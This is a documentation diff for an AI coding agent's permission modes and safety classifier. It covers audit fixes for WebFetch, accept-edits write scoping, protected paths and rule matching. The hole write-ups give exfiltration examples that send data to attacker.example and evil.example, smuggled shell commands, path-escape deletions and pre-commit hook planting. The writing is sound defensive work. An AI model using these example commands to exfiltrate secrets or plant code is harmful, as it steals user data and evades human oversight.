@@ -65,29 +65,55 @@ first — `$(echo rm) -rf /`, `x=-rf; rm $x /`, `bash -c '…'`, `eval`, aliases
 
 Two name classes drive the evaluators:
 
-- **read-only**: `Read`, `Grep`, `Glob`, `WebFetch`, `Lsp`
-- **write-capable**: `Bash`, `Edit`, `Write`, and anything starting `mcp__`
+- **read-only**: `Read`, `Grep`, `Glob`, `Lsp`
+- **write-capable**: `Bash`, `Edit`, `Write`, `Task`, and anything starting `mcp__`
 
-Note what is in *neither* list: `WebSearch`, `Skill` and `doctor`. They fall
-through to each mode's default arm — `Ask` under `default` and `plan`, `Deny`
-under `dont-ask`.
+Note what is in *neither* list: `WebFetch`, `WebSearch`, `Skill` and `doctor`.
+They fall through to each mode's default arm — `Ask` under `default`,
+`accept-edits` and `plan`, `Deny` under `dont-ask`.
+
+**`WebFetch` is not a read** (audit F-P6). It writes nothing locally, but
+"read-only" here means "safe to run unasked", and a fetch is an outbound request
+whose URL the model composes: `WebFetch https://attacker.example/?d=<base64 of
+what Read just returned>` used to run **unprompted** under `default`, `plan`
+and even `dont-ask`. It now asks under `default`, `accept-edits` and `plan` and
+is denied under `dont-ask`. To trust a host, add a `WebFetch(domain:…)` allow
+rule — see [Rules](#rules).
 
 | Mode | Read-only | Writes | Everything else |
 |---|---|---|---|
 | `default` | Allow | Ask | Ask |
-| `accept-edits` | Allow | scoped filesystem writes Allow; the rest Ask | Ask |
+| `accept-edits` | Allow | `Edit`/`Write` inside the project root Allow; `mkdir`/`touch`/`rmdir` via `Bash` on contained paths Allow; the rest (`rm`, `mv`, `cp` included) Ask | Ask |
 | `plan` | Allow | `Bash` Allow only when every command in it is a known read-only one (no file redirection, no substitution), otherwise Deny; `Edit`/`Write`/`mcp__*` Deny | Ask |
-| `auto` | gated by `SafetyClassifier`, with a 3-strike / 20-total circuit breaker | as classified | as classified |
+| `auto` | gated by `SafetyClassifier`, with a 3-strike / 20-total circuit breaker | as classified (`Bash` by command, `Edit`/`Write` by target); `mcp__*` Ask | as classified (`WebFetch` by its URL) |
 | `dont-ask` | Allow | Deny | Deny |
 | `bypass-permissions` | Allow | Allow | Allow |
 
-`accept-edits`' "scoped filesystem writes" are `mkdir`, `touch`, `mv`, `cp`,
-`rm`, `rmdir` **via `Bash`**, scoped to the working directory. There is no
-`mkdir` tool at runtime; real calls route through
-`Bash(command: "mkdir …")`.
+### `accept-edits`
 
-Because this is a **grant** path — the decision runs the command with no
-prompt — the predicate behind it (`isScopedWriteTool()`) resolves anything it
+The mode grants **edits** (audit F-P4), and the grant was the other way round
+until then: `Edit` and `Write` asked — a hard refusal wherever no prompt is
+attached — while `rm ./src/Main.php` ran unprompted. Now:
+
+- **The `Edit` and `Write` tools run without asking** when their `file_path` is
+  strictly inside the project root and not under `.git`, `.sugar-crush` or
+  `.mcp.json` (`Permissions\WritePathScope`). On the live tool loop the gate is
+  handed the root, so the path is resolved the way the tool resolves it: an
+  absolute in-root path is fine, `../x`, `/etc/hosts` and `~/…` ask, and so does
+  a symlink that points out of the project or onto `.git`. A gate with no root
+  (a sub-agent's own gate) can only judge the spelling: a relative path that
+  stays below the working directory is granted, an absolute one asks.
+- **`rm`, `mv` and `cp` ask**, like every other shell command. `rm` deletes
+  content and `cp`/`mv` overwrite their destination; use `Edit`/`Write`, whose
+  changes are reviewable, or approve the shell command.
+- **`mkdir`, `touch` and `rmdir` via `Bash`** still run without asking when every
+  path is below the working directory. None of the three destroys content:
+  `touch` on an existing file changes its times, and `rmdir` removes only an
+  empty directory. There is no `mkdir` tool at runtime; real calls route
+  through `Bash(command: "mkdir …")`.
+
+Because the shell half is a **grant** path — the decision runs the command with
+no prompt — the predicate behind it (`isScopedWriteTool()`) resolves anything it
 cannot judge with certainty to `Ask`, not to `Allow`. Concretely:
 
 - The command line must be a **single simple command**. Any unquoted `;`, `&&`,
@@ -111,15 +137,15 @@ cannot judge with certainty to `Ask`, not to `Allow`. Concretely:
 - Every path argument must be relative **and stay strictly below the working
   directory**, resolved lexically. `../` escapes now prompt (`rm ../../../etc/passwd`
   used to auto-run — being non-absolute was the only test), and so does the root
-  itself: `rm -rf .` is not "something inside the directory".
+  itself: `rmdir .` is not "something inside the directory".
 - A path with a **`.git`, `.sugar-crush` or `.mcp.json` segment** prompts even
-  though it is contained (audit F-J4): `cp ./x ./.git/hooks/pre-commit` plants
-  code that runs on your next `git commit`, `rm ./.git/index` is not an edit,
-  `.sugar-crush/` holds hooks, presets and settings, and `.mcp.json` names
-  commands the next launch spawns. The segment is matched the way bash matches
-  a glob to a dotfile, so `./.g*/hooks/x` prompts while `rm ./*` still auto-runs;
-  `.gitignore` and `.github/` are different names and are unaffected.
-  `.claude/` and `.opencode/` are not on the list.
+  though it is contained (audit F-J4): `touch ./.git/hooks/pre-commit` plants a
+  hook that runs on your next `git commit`, `.sugar-crush/` holds hooks, presets
+  and settings, and `.mcp.json` names commands the next launch spawns. The
+  segment is matched the way bash matches a glob to a dotfile, so
+  `./.g*/hooks/x` prompts while `touch ./*` still auto-runs; `.gitignore` and
+  `.github/` are different names and are unaffected. `.claude/` and `.opencode/`
+  are not on the list. The same list guards the `Edit`/`Write` grant above.
 - Flags are a **whitelist** (`-p -f -i -r -R -v -n -d` and their long forms, plus
   `--`). An unrecognised flag prompts. "Anything starting with `-` is a flag,
   skip it" silently skipped flags that take a path, so `mv -t ../../etc ./x`
@@ -127,11 +153,12 @@ cannot judge with certainty to `Ask`, not to `Allow`. Concretely:
 - The command word is matched **case-sensitively**. `MKDIR ./x` is not `mkdir`
   on a case-sensitive filesystem, and it used to auto-run.
 
-Two limits are deliberate and worth knowing. **Symlinks are not resolved** —
-`rm ./link-pointing-outside` is spelled as a contained relative path and is
-treated as one; resolving would mean touching the filesystem and would still
-race the command being approved. **Globs are not expanded** — `rm ./*` is judged
-as the literal token. Neither can introduce a command, which is what the
+Two limits of the shell half are deliberate and worth knowing. **Symlinks are
+not resolved** — `touch ./link-pointing-outside` is spelled as a contained
+relative path and is treated as one; resolving would mean touching the
+filesystem and would still race the command being approved (the `Edit`/`Write`
+grant *does* resolve, because those tools resolve the same way at use).
+**Globs are not expanded** — `touch ./*` is judged as the literal token. Neither can introduce a command, which is what the
 separator rule is for; brace expansion *can* name a parent (`{.,..}/x`), which
 is why `{`/`}` are refused and `*`/`?`/`[` are not.
 
@@ -210,6 +237,29 @@ A `Bash` **declaration** — a name with no arguments, which is what a workflow
 stage's `tools:` list is — is still allowed under `plan`: it has no command to
 judge, and each real call is judged when it arrives. A real call with no
 `command` at all is denied.
+
+### What `auto` classifies
+
+`SafetyClassifier` reads three tools, each by the argument that carries its
+risk (audit F-P3(b) — before it, only `Bash` was read, so
+`Write .git/hooks/pre-commit`, `WebFetch https://evil.example/?k=SECRET` and
+`mcp__db__drop_table` all ran under `auto`):
+
+| Call | Blocked as | When |
+|---|---|---|
+| `Bash` | one of the command categories (`curl/wget-into-shell`, `external-endpoint`, `force-push-reset-hard`, …) | the command matches a row |
+| `Edit` / `Write` | `protected-path-write` | the target is under `.git`, `.sugar-crush` or `.mcp.json` |
+| `Edit` / `Write` | `outside-root-write` | the target is not provably inside the project root — absolute elsewhere, escaping, `~/…`, a symlink out, or absent |
+| `WebFetch` | `external-endpoint` | the URL carries a query string or `user:pass@`, or cannot be parsed |
+| `mcp__*` | — (asks) | always: an MCP tool's capability is server-defined, so nothing can classify it |
+
+A `WebFetch` whose URL carries no query is allowed. Data can still ride in a
+URL's *path* (`https://evil.example/<base64>`), which no classifier can tell
+from an ordinary page; `auto` is a guard rail here, and `default`/`dont-ask`
+withholding `WebFetch` outright is the boundary. An `mcp__*` ask is neither a
+strike nor a safe call, so it leaves the breaker exactly where it was. An
+explicit rule still comes first — `Allow mcp__git__*` grants those tools under
+`auto` without asking.
 
 ### `auto`'s circuit breaker
 
@@ -296,6 +346,24 @@ How the argument half is matched:
   `git log > /tmp/out` — and is then matched against the command as written,
   never the quote-removed words, so a quoted `'>'` cannot stand in for a real
   redirection.
+- **`WebFetch(domain:…)`** matches the **host** of the url, not the url text
+  (audit F-P6) — Claude Code's spelling, so an imported preset's
+  `WebFetch(domain:github.com)` works as written. The host is read by the same
+  parser the tool dials with, so `https://github.com@evil.example/` is
+  `evil.example`. The value is a case-insensitive glob over the host:
+  `domain:github.com` is that host, `domain:*.github.com` its subdomains (write
+  both to allow both). An `allow` covers exactly what it spells; a `deny` or
+  `ask` also covers subdomains (`Deny WebFetch(domain:evil.example)` stops
+  `x.evil.example`), and fires on a url nobody can parse, where an `allow` does
+  not. Granting a domain also grants wherever it **redirects** — `WebFetch`
+  follows up to three redirects, re-checking addresses but not rules. A
+  `WebFetch(...)` pattern without `domain:` is still a literal glob over the
+  whole url, and a poor grant: `Allow WebFetch(https://github.com*)` also
+  matches `https://github.com.evil.example/`.
+
+  ```json
+  { "pattern": "WebFetch(domain:docs.php.net)", "action": "allow" }
+  ```
 - **Path subjects** are normalised lexically on both sides — `./`, `//`, `.`
   and `..` segments — so `Deny Read(./.env)` also covers `.env` and
   `./foo/../.env`, and a relative restrictive pattern matches at any depth
